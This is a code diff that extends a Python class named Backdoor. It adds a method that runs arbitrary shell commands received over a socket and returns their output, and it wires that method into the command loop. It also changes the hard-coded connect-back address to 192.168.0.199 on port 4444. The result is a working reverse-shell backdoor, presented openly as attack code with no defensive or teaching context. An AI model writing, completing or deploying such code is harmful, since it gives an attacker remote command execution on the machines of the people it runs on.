@@ -33,6 +33,14 @@ class Backdoor:
 					time.sleep(3)
 
 
+	def execute_system_command(self, command):
+		try:
+			res = UkDecode(subprocess.check_output(command, shell = True))
+			return res
+		except:
+			return "[-] Check your command"
+
+
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
 		self.connection.send(json_data.encode())
@@ -52,14 +60,17 @@ class Backdoor:
 			if self.connected:
 				command = self.reliable_recive()
 				if command == "exit":
-					print(command)
 					self.reliable_send("")
 					self.connected = False
+
+				else:
+					res = self.execute_system_command(command)
+					self.reliable_send(res)
 
 
 
 if __name__ == "__main__":
-	backdoor = Backdoor("192.168.0.108", 4444)
+	backdoor = Backdoor("192.168.0.199", 4444)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
 	backdoor_thread.start()
